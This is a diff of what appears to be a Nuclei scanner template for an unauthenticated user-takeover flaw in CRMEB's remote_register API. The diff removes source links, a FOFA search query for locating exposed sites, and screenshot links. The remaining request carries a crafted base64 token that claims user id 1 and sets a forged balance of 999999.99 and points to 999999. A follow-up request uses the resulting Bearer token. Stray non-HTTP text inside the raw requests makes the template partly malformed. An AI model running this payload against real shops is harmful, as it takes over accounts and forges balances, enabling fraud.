@@ -3,19 +3,14 @@ info:
   name: CRMEB remote_register存在未授权任意用户接管漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/br7izl9r5q9gzgsg'
+  description: ''
   tags: unauth,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: br7izl9r5q9gzgsg
-    fofa: body="/wap/first/zsff/iconfont/iconfont.css" || body="CRMEB"
 http:
 - raw:
   - 'GET /api/remote_register?remote_token=eyJ1aWQiOjEsInBob25lIjoiIiwibmlja25hbWUiOiJ0ZXN0IiwiYXZhdGFyIjoiIiwibm93X21vbmV5Ijo5OTk5OTkuOTksImludGVncmFsIjo5OTk5OTksImV4cCI6MH0 HTTP/1.1
 
     Host: {{Hostname}}
 
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1789394327579-bc6d4268-ef48-4466-aaec-b66b6255a5d6.png)
 
     验证'
   redirects: false
@@ -28,9 +23,7 @@ http:
 
     Host: {{Hostname}}
 
-    Authori-zation: Bearer <token>
-
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1789394327902-b41ca2b2-5f7f-4e74-a5b2-9b361e084720.png)'
+    Authori-zation: Bearer <token>'
   redirects: false
   matchers:
   - status:
